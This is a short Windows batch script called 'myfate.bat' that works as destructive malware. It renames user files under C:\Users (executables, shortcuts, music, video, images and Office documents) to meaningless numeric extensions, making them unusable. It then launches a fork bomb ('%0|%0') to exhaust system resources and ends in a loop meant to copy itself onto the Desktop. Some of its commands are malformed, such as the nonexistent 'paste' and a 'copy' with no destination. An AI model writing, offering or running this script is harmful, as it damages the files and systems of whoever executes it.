@echo off
copy myfate.bat
cd C:\Users
ren *.exe *.1726
ren *.lnk *.1924
ren *.mp3 *.9182
ren *.mp4 *.1900
ren *.gif *.9102
ren *.docx *.1029
ren *.xlsx *.1928
ren *.pptx *.1911
%0|%0
cd C:\Users\%USERNAME%\Desktop
:c
paste myfate.bat
paste myfate.bat
goto c